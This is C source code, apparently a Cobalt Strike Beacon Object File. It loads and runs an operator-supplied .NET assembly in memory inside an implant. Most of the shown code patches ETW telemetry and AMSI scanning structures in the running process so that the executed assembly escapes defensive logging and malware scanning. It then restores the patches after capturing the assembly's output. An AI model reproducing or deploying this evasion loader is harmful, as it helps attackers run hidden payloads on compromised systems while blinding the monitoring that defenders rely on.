    HMODULE clrBase = getImageBase(L"clr.dll");
    if (clrBase == NULL) {
        HMODULE kernel32Base = getImageBase(L"KERNEL32.DLL");
        
        BOOL result;

        // load clr.dll into the current process
        CLRContext ctx;
        MSVCRT$memset(&ctx, 0, sizeof(ctx));
        startCLR(&ctx, 0);
        cleanupCLR(kernel32Base, &ctx);

        _LoadLibraryA loadLibraryA = (_LoadLibraryA)getProcAddr(kernel32Base, "LoadLibraryA");
        clrBase = loadLibraryA("clr.dll");

        if (clrBase == NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Unable to load clr.dll - Exiting\n");
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] clr.dll loaded: %p\n", clrBase);

    printClrVersion(clrBase);

    int* handleAddr = findDotNetRuntimeHandle();
    BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle address: %p\n", handleAddr);

    int* enableBitsAddr = findDotNETRuntimeEnableBits();
    BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits address: %p\n", enableBitsAddr);

    long long p_AmsiScanBufferGlobal = 0;
    long long p_amsiContext = 0;
    findAmsiGlobals(&p_AmsiScanBufferGlobal, &p_amsiContext, 0);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBufferGlobal address: %p\n", p_AmsiScanBufferGlobal);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] amsiContext address: %p\n", p_amsiContext);
}   

void go(char *args, int len) {
    // parse arguments
    datap parser;
    BeaconDataParse(&parser, args, len);
    unsigned char* assemblyBytes = BeaconDataExtract(&parser, NULL);
    size_t assemblyLength = BeaconDataInt(&parser);
    char* assemblyArgs = BeaconDataExtract(&parser, NULL);
    size_t patchEtwHandle = BeaconDataInt(&parser);
    size_t patchEtwEnableBits = BeaconDataInt(&parser);
    size_t patchAmsi = BeaconDataInt(&parser);
    size_t verbose = BeaconDataInt(&parser);
    size_t scan = BeaconDataInt(&parser);

    if (scan) {
        doScan();
        return;
    }

    if (assemblyLength == 0) {
        return;
    }

    // get function pointers
    HMODULE kernel32Base = getImageBase(L"KERNEL32.DLL");

    BOOL result;

    // initialize custom context struct to hold CLR values
    CLRContext ctx;
    MSVCRT$memset(&ctx, 0, sizeof(ctx));
    result = startCLR(&ctx, verbose);
    if (!result) {
        cleanupCLR(kernel32Base, &ctx);
        return;
    }

    if (verbose) {
        HMODULE clrBase = getImageBase(L"clr.dll");
        printClrVersion(clrBase);
    }

    // provider handle patching
    int* handleAddr; 
    int handleVal;
    if (patchAmsi && patchEtwHandle) {
        handleAddr = findDotNetRuntimeHandle();
        turnOffEtwHandle(handleAddr, &handleVal);

        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle address: %p\n", handleAddr);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle value: %x\n", handleVal);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle patched: %x\n", *handleAddr);
        }
    }
    
    // enable bits patching
    int* enableBitsAddr;
    int enableBitsVal;
    if (patchEtwEnableBits) {
        enableBitsAddr = findDotNETRuntimeEnableBits();
        turnOffEtwEnableBits(enableBitsAddr, &enableBitsVal);
        
        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits address: %p\n", enableBitsAddr);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits value: %x\n", enableBitsVal);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits patched: %x\n", *enableBitsAddr);
        }
    }

    // load amsi.dll first to pre-patch the dll
    // HMODULE amsiBase = NULL;
    // if (patchAmsi) {
    //     _LoadLibraryA loadLibraryA = (_LoadLibraryA)getProcAddr(kernel32Base, "LoadLibraryA");
    //     amsiBase = loadLibraryA("amsi.dll");
    //     if (verbose && amsiBase) {
    //         BeaconPrintf(CALLBACK_OUTPUT, "[+] amsi.dll loaded: %p\n", amsiBase);
    //     } else if (verbose) {
    //         BeaconPrintf(CALLBACK_OUTPUT, "[+] amsi.dll not loaded\n");
    //     }
    // }

    // amsi patching
    long long p_AmsiScanBufferGlobal = 0;
    long long p_amsiContext = 0;
    long long p_savedAmsiScanBuffer;
    long long p_savedAmsiContext;
    if (patchAmsi && findAmsiGlobals(&p_AmsiScanBufferGlobal, &p_amsiContext, verbose)) {
        turnOffAmsi(p_AmsiScanBufferGlobal, p_amsiContext, &p_savedAmsiScanBuffer, &p_savedAmsiContext);
        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBufferGlobal address: %p\n", p_AmsiScanBufferGlobal);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBufferGlobal value: %p\n", p_savedAmsiScanBuffer);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBufferGlobal patched: %p (fakeAmsiScanBuffer)\n", *(long long*)p_AmsiScanBufferGlobal);

            BeaconPrintf(CALLBACK_OUTPUT, "[+] amsiContext address: %p\n", p_amsiContext);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] amsiContext value: %p\n", p_savedAmsiContext);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] amsiContext patched: %p\n", *(long long*)p_amsiContext);
        }
    }
    
    // create pipes
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    result = createPipe(kernel32Base, &hReadPipe, &hWritePipe, verbose);

    // check and create console
    BOOL allocatedConsole = createConsole(kernel32Base, verbose);

    // redirect pipes
    HANDLE hOriginalStdout = redirectPipes(kernel32Base, hReadPipe, hWritePipe, verbose);
    if (!hOriginalStdout) {
        cleanupCLR(kernel32Base, &ctx);
        return;
    }

    // create AppDomain
    result = createAppDomain(kernel32Base, &ctx, hOriginalStdout, verbose);
    if (!result) {
        cleanupCLR(kernel32Base, &ctx);
        restoreStd(kernel32Base, hOriginalStdout, hWritePipe);
        return;
    }

    // load target assembly
    result = loadAssembly(kernel32Base, assemblyBytes, assemblyLength, hOriginalStdout, &ctx, verbose);
    if (!result) {
        cleanupCLR(kernel32Base, &ctx);
        restoreStd(kernel32Base, hOriginalStdout, hWritePipe);
        return;
    }

    // execute target assembly
    result = executeAssembly(kernel32Base, &ctx, assemblyArgs);
    if (!result) {
        cleanupCLR(kernel32Base, &ctx);
        restoreStd(kernel32Base, hOriginalStdout, hWritePipe);
        return;
    }

    if (verbose) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Assembly executed, reading output...\n");
    }
    
    // restore stdout immediately and close write pipe
    restoreStd(kernel32Base, hOriginalStdout, hWritePipe);
    
    // read from pipe
    DWORD totalBytesRead = 0;
    char* returnData = readOutput(hReadPipe, &totalBytesRead);
    
    // close read pipe
    _CloseHandle pCloseHandle = (_CloseHandle)getProcAddr(kernel32Base, "CloseHandle");
    pCloseHandle(hReadPipe);

    if (totalBytesRead > 0) {
        returnData[totalBytesRead] = '\0';
        BeaconPrintf(CALLBACK_OUTPUT, "\n%s\n", returnData);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] No output captured (%d bytes read)\n", totalBytesRead);
    }

    MSVCRT$free(returnData);

    cleanupCLR(kernel32Base, &ctx);
    restoreStd(kernel32Base, hOriginalStdout, hWritePipe);

    // restore handleAddr
    if (patchEtwHandle) {
        turnOnEtwHandle(handleAddr, handleVal);

        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle value restored: %x\n", *handleAddr);
        }
    }

    // restore enable bits
    if (patchEtwEnableBits) {
        turnOnEtwEnableBits(enableBitsAddr, enableBitsVal);
        
        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits value restored: %x\n", *enableBitsAddr);
        }
    }
	
	// restore p_amsiContext and p_AmsiScanBufferGlobal
    if (patchAmsi && p_AmsiScanBufferGlobal && p_amsiContext) {
        turnOnAmsi(p_AmsiScanBufferGlobal, p_amsiContext, p_savedAmsiScanBuffer, p_savedAmsiContext);
        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBufferGlobal value restored: %p\n", *(long long*)p_AmsiScanBufferGlobal);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] amsiContext value restored: %p\n", *(long long*)p_amsiContext);
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done\n");
}